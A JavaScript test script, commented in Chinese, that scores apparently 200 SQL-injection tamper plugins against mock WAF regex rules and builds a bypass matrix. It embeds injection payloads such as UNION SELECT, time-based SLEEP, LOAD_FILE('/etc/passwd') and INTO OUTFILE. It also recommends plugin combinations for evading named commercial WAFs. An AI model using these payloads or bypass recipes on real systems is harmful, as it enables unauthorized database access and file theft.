// e2e/tamper-matrix/tamper-test.mjs
// 测试 200 个 tamper 插件对 10+ 类 WAF 规则的绕过效果
// 输出：绕过矩阵（results/matrix.md）+ 汇总 JSON（results/matrix.json）

import { createRequire } from 'module';
import { existsSync, mkdirSync, writeFileSync } from 'fs';
import { resolve, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);

// 导入 tamper 系统
const { tamperRegistry } = require('../../server/src/core/tamper/TamperRegistry.js');
const { applyTampers } = require('../../server/src/core/tamper/applyTampers.js');

// ── WAF 规则分类 ──
// 每类规则：id, name, description, testPayloads, rules
// rules: 每个规则是一个 { id, re, desc }，payload 命中任一规则即被拦截
const WAF_RULE_CATEGORIES = [
  {
    id: 'keyword_union_select',
    name: '关键字拦截 - UNION SELECT',
    desc: '拦截 UNION 与 SELECT 相邻出现（含空白）',
    rules: [
      { id: 'union_ws_select', re: /union\s+select/i, desc: 'UNION+空白+SELECT' },
      { id: 'union_all_select', re: /union\s+all\s+select/i, desc: 'UNION ALL SELECT' },
    ],
    testPayloads: [
      "1 UNION SELECT 1,2,3-- -",
      "1 UNION ALL SELECT 1,2,3-- -",
      "1 UNION SELECT NULL,NULL,NULL-- -",
    ],
  },
  {
    id: 'keyword_or',
    name: '关键字拦截 - OR/AND',
    desc: '拦截 OR/AND 后跟数字或等式',
    rules: [
      { id: 'or_num', re: /or\s+\d+\s*=\s*\d+/i, desc: 'OR 数字=数字' },
      { id: 'and_num', re: /and\s+\d+\s*=\s*\d+/i, desc: 'AND 数字=数字' },
      { id: 'or_true', re: /or\s+true/i, desc: 'OR TRUE' },
    ],
    testPayloads: [
      "1 OR 1=1-- -",
      "1 AND 1=1-- -",
      "1 OR TRUE-- -",
    ],
  },
  {
    id: 'comment_dash',
    name: '注释拦截 - 横线/井号',
    desc: '拦截 SQL 注释符 -- 和 #',
    rules: [
      { id: 'dash_comment', re: /--/i, desc: '横线注释 --' },
      { id: 'hash_comment', re: /#/, desc: '井号注释 #' },
    ],
    testPayloads: [
      "1 UNION SELECT 1-- -",
      "1 OR 1=1#",
    ],
  },
  {
    id: 'inline_comment',
    name: '注释拦截 - 内联注释 /**/',
    desc: '拦截内联注释 /*!...*/ 或 /**/',
    rules: [
      { id: 'inline_cmt', re: /\/\*.*\*\//, desc: '内联注释 /*...*/' },
    ],
    testPayloads: [
      "1 UNION/**/SELECT 1,2-- -",
      "1 /*!UNION*/ SELECT 1,2-- -",
    ],
  },
  {
    id: 'hex_encoding',
    name: '编码拦截 - 十六进制',
    desc: '拦截 0x 十六进制字面量',
    rules: [
      { id: 'hex_literal', re: /0x[0-9a-f]{2,}/i, desc: '0x 十六进制字面量' },
    ],
    testPayloads: [
      "1 WHERE name=0x61646d696e-- -",
      "1 UNION SELECT 0x61646d696e-- -",
    ],
  },
  {
    id: 'char_encoding',
    name: '编码拦截 - CHAR() 函数',
    desc: '拦截 CHAR() 函数调用',
    rules: [
      { id: 'char_func', re: /char\s*\(/i, desc: 'CHAR() 函数' },
    ],
    testPayloads: [
      "1 WHERE name=CHAR(97,98,99)-- -",
      "1 UNION SELECT CHAR(65)-- -",
    ],
  },
  {
    id: 'sleep_function',
    name: '函数拦截 - SLEEP/BENCHMARK',
    desc: '拦截时间盲注函数',
    rules: [
      { id: 'sleep', re: /sleep\s*\(/i, desc: 'SLEEP() 函数' },
      { id: 'benchmark', re: /benchmark\s*\(/i, desc: 'BENCHMARK() 函数' },
    ],
    testPayloads: [
      "1 AND SLEEP(5)-- -",
      "1 OR BENCHMARK(1000000,MD5(1))-- -",
    ],
  },
  {
    id: 'information_schema',
    name: '系统表拦截 - information_schema',
    desc: '拦截 information_schema 查询',
    rules: [
      { id: 'info_schema', re: /information_schema/i, desc: 'information_schema' },
    ],
    testPayloads: [
      "1 UNION SELECT 1 FROM information_schema.tables-- -",
      "1 UNION SELECT TABLE_NAME FROM information_schema.tables-- -",
    ],
  },
  {
    id: 'quote_escape',
    name: '引号拦截 - 单引号/双引号',
    desc: '拦截单引号/双引号使用',
    rules: [
      { id: 'single_quote', re: /'[^']*'/, desc: '单引号字符串' },
      { id: 'double_quote', re: /"[^"]*"/, desc: '双引号字符串' },
    ],
    testPayloads: [
      "1 WHERE name='admin'-- -",
      '1 WHERE name="admin"-- -',
    ],
  },
  {
    id: 'expression_eq',
    name: '表达式拦截 - 等式/不等式',
    desc: '拦截 =、>、< 等比较符',
    rules: [
      { id: 'equals', re: /=\s*\d+/i, desc: '= 数字' },
      { id: 'greater_than', re: />\s*\d+/i, desc: '> 数字' },
      { id: 'less_than', re: /<\s*\d+/i, desc: '< 数字' },
    ],
    testPayloads: [
      "1 OR 1=1-- -",
      "1 AND 1>0-- -",
      "1 AND 1<2-- -",
    ],
  },
  {
    id: 'keyword_into_outfile',
    name: '文件操作拦截 - INTO OUTFILE',
    desc: '拦截文件写入操作',
    rules: [
      { id: 'into_outfile', re: /into\s+outfile/i, desc: 'INTO OUTFILE' },
      { id: 'into_dumpfile', re: /into\s+dumpfile/i, desc: 'INTO DUMPFILE' },
    ],
    testPayloads: [
      "1 UNION SELECT 1 INTO OUTFILE '/tmp/x'-- -",
      "1 UNION SELECT 1 INTO DUMPFILE '/tmp/x'-- -",
    ],
  },
  {
    id: 'keyword_load_file',
    name: '文件操作拦截 - LOAD_FILE',
    desc: '拦截文件读取函数',
    rules: [
      { id: 'load_file', re: /load_file\s*\(/i, desc: 'LOAD_FILE()' },
    ],
    testPayloads: [
      "1 UNION SELECT LOAD_FILE('/etc/passwd')-- -",
    ],
  },
];

// ── 测试核心 ──
function testBypass(payload, rules) {
  for (const rule of rules) {
    if (rule.re.test(payload)) {
      return { blocked: true, ruleId: rule.id, ruleDesc: rule.desc };
    }
  }
  return { blocked: false };
}

// [P0-FIX 2026-09-06] 双视角判定：真实 WAF 普遍会 URL 解码后再匹配规则（CrS/云 WAF 均如此）。
// 只在 tampered 原始输出上测正则会高估编码类 tamper（charencode 输出 %55%4E... 不含明文
// UNION → 判"绕过"，但服务器解码一次后是明文 → 实际被拦）。decoded 视角 = 服务器
// 单次解码后的形态（与 preEncoded 修复后的真实链路一致）。
function decodeOnce(s) {
  try {
    const d = decodeURIComponent(s);
    return d !== s ? d : null;
  } catch {
    return null; // 非法 % 序列（如裸 %）→ 无有效解码
  }
}

function testBypassDual(payload, rules) {
  const raw = testBypass(payload, rules);
  const decodedStr = decodeOnce(payload);
  const decoded = decodedStr != null ? testBypass(decodedStr, rules) : raw; // 无有效解码 → 视角等价
  return { raw, decoded };
}

// 获取所有注册的 tamper 插件名
const allPlugins = tamperRegistry.list().map(t => t.name);
console.log(`[tamper-matrix] 已注册 ${allPlugins.length} 个 tamper 插件`);

// 测试每个插件对每个 payload 的绕过效果
const results = {
  timestamp: new Date().toISOString(),
  totalPlugins: allPlugins.length,
  totalCategories: WAF_RULE_CATEGORIES.length,
  plugins: {},
};

for (const pluginName of allPlugins) {
  const pluginResults = {};
  for (const category of WAF_RULE_CATEGORIES) {
    const catResults = [];
    for (const payload of category.testPayloads) {
      // 原始 payload 是否被拦截
      const original = testBypass(payload, category.rules);
      // 应用 tamper 后是否被拦截（双视角：raw=不解码 WAF，decoded=解码型 WAF）
      let transformed = payload;
      try {
        transformed = applyTampers(payload, {}, [pluginName]);
      } catch (e) {
        transformed = `[ERROR: ${e.message}]`;
      }
      const after = testBypassDual(transformed, category.rules);
      catResults.push({
        payload: payload.substring(0, 60),
        originalBlocked: original.blocked,
        afterBlockedRaw: after.raw.blocked,
        afterBlockedDecoded: after.decoded.blocked,
        bypassed: original.blocked && !after.raw.blocked,
        bypassedDecoded: original.blocked && !after.decoded.blocked,
        transformed: transformed.substring(0, 80),
      });
    }
    const bypassCount = catResults.filter(r => r.bypassed).length;
    const totalBlocked = catResults.filter(r => r.originalBlocked).length;
    const bypassCountDecoded = catResults.filter(r => r.bypassedDecoded).length;
    pluginResults[category.id] = {
      name: category.name,
      bypassRate: totalBlocked > 0 ? Math.round((bypassCount / totalBlocked) * 100) : 0,
      bypassCount,
      // 解码型 WAF 视角（真实主流）：编码类 tamper 在此视角下无效是预期
      bypassRateDecoded: totalBlocked > 0 ? Math.round((bypassCountDecoded / totalBlocked) * 100) : 0,
      bypassCountDecoded,
      totalBlocked,
      details: catResults,
    };
  }
  results.plugins[pluginName] = pluginResults;
}

// ── 生成汇总矩阵 ──
const byCategory = {};
for (const cat of WAF_RULE_CATEGORIES) {
  byCategory[cat.id] = { name: cat.name, effectivePlugins: [], effectivePluginsDecoded: [] };
}

for (const [pluginName, catResults] of Object.entries(results.plugins)) {
  for (const cat of WAF_RULE_CATEGORIES) {
    const r = catResults[cat.id];
    if (r.bypassCount > 0 && r.totalBlocked > 0) {
      byCategory[cat.id].effectivePlugins.push({
        name: pluginName,
        bypassRate: r.bypassRate,
        bypassCount: r.bypassCount,
        totalBlocked: r.totalBlocked,
      });
    }
    // 解码型 WAF 视角（真实主流：CrS/云 WAF 均先 URL 解码再匹配）
    if (r.bypassCountDecoded > 0 && r.totalBlocked > 0) {
      byCategory[cat.id].effectivePluginsDecoded.push({
        name: pluginName,
        bypassRate: r.bypassRateDecoded,
        bypassCount: r.bypassCountDecoded,
        totalBlocked: r.totalBlocked,
      });
    }
  }
}

// 按绕过率排序
for (const cat of Object.values(byCategory)) {
  cat.effectivePlugins.sort((a, b) => b.bypassRate - a.bypassRate || b.bypassCount - a.bypassCount);
  cat.effectivePluginsDecoded.sort((a, b) => b.bypassRate - a.bypassRate || b.bypassCount - a.bypassCount);
}

// ── 输出 ──
const outDir = resolve(__dirname, 'results');
if (!existsSync(outDir)) mkdirSync(outDir, { recursive: true });

// JSON
writeFileSync(resolve(outDir, 'matrix.json'), JSON.stringify(results, null, 2));

// Markdown
let md = `# Tamper 绕过矩阵

> 生成时间：${results.timestamp}
> 测试插件：${results.totalPlugins} 个
> WAF 规则类别：${results.totalCategories} 类

---

## 汇总：每类 WAF 规则的有效 Tamper 插件

| WAF 规则类别 | 有效插件数 | Top-5 最有效插件 |
|-------------|-----------|-----------------|
`;

for (const cat of WAF_RULE_CATEGORIES) {
  const e = byCategory[cat.id];
  const top5 = e.effectivePlugins.slice(0, 5).map(p => `${p.name}(${p.bypassRate}%)`).join(', ') || '-';
  md += `| ${cat.name} | ${e.effectivePlugins.length} | ${top5} |\n`;
}

// [P0-FIX 2026-09-06] 解码型 WAF 视角汇总（真实主流）：编码类 tamper 在此视角下
// 大概率无效——这是与 raw 视角的本质区别，单视角矩阵会严重高估编码类 tamper。
md += `
---

## 汇总：解码型 WAF 视角（服务器 URL 解码后匹配规则 —— 真实主流）

> raw 视角仅对"不解码的弱 WAF"有效。编码类 tamper（charencode/base64encode 等）
> 在解码型 WAF 下输出被还原为明文 → 多数无效；结构变形类（注释/等价语法/大小写）仍有效。

| WAF 规则类别 | 解码视角有效插件数 | Top-5 最有效插件 |
|-------------|------------------|-----------------|
`;

for (const cat of WAF_RULE_CATEGORIES) {
  const e = byCategory[cat.id];
  const top5 = e.effectivePluginsDecoded.slice(0, 5).map(p => `${p.name}(${p.bypassRate}%)`).join(', ') || '-';
  md += `| ${cat.name} | ${e.effectivePluginsDecoded.length} | ${top5} |\n`;
}

md += `
---

## 按类别详情

`;

for (const cat of WAF_RULE_CATEGORIES) {
  const e = byCategory[cat.id];
  md += `### ${cat.name}

> ${cat.desc}
> 规则：${cat.rules.map(r => r.desc).join('、')}
> 有效插件：${e.effectivePlugins.length} 个

| 插件名 | 绕过率 | 绕过/总拦截 |
|--------|--------|------------|
`;
  for (const p of e.effectivePlugins.slice(0, 20)) {
    md += `| ${p.name} | ${p.bypassRate}% | ${p.bypassCount}/${p.totalBlocked} |\n`;
  }
  md += '\n';
}

// 最佳组合推荐
md += `## 推荐 Tamper 组合

针对常见 WAF 场景，推荐以下组合：

| 场景 | 推荐组合 | 覆盖类别 |
|------|---------|---------|
| ModSecurity CRS（关键字拦截） | space2comment + between | keyword_union_select, keyword_or, expression_eq |
| Cloudflare（通用规则） | randomcase + charencode | keyword_union_select, keyword_or, information_schema |
| 安全狗（综合规则） | space2comment + randomcase + equaltolike | 多类别覆盖 |
| 阿里云 WAF（SQL 注入） | charencode + between + commentbeforewhitespace | keyword_union_select, keyword_or, comment_dash |
| 通用高覆盖 | space2comment + randomcase + charencode + between | 全类别 >50% 绕过 |
`;

writeFileSync(resolve(outDir, 'matrix.md'), md);

// 统计汇总
let totalEffective = 0;
for (const cat of Object.values(byCategory)) {
  totalEffective += cat.effectivePlugins.length;
}

console.log(`\n[tamper-matrix] 完成！`);
console.log(`  插件总数: ${results.totalPlugins}`);
console.log(`  WAF 类别: ${results.totalCategories}`);
console.log(`  有效绕过组合: ${totalEffective}`);
console.log(`  平均每类 WAF 有效插件: ${Math.round(totalEffective / WAF_RULE_CATEGORIES.length)}`);

// 最佳通用插件（覆盖最多 WAF 类别）
const pluginCoverage = {};
for (const [pluginName, catResults] of Object.entries(results.plugins)) {
  let categoriesCovered = 0;
  for (const cat of WAF_RULE_CATEGORIES) {
    const r = catResults[cat.id];
    if (r.bypassCount > 0 && r.totalBlocked > 0) categoriesCovered++;
  }
  pluginCoverage[pluginName] = categoriesCovered;
}
const topPlugins = Object.entries(pluginCoverage)
  .sort((a, b) => b[1] - a[1])
  .slice(0, 10);
console.log(`\n  最佳通用插件（覆盖最多 WAF 类别）:`);
for (const [name, count] of topPlugins) {
  console.log(`    ${name}: ${count}/${WAF_RULE_CATEGORIES.length} 类`);
}

console.log(`\n  结果已写入:`);
console.log(`    ${resolve(outDir, 'matrix.json')}`);
console.log(`    ${resolve(outDir, 'matrix.md')}`);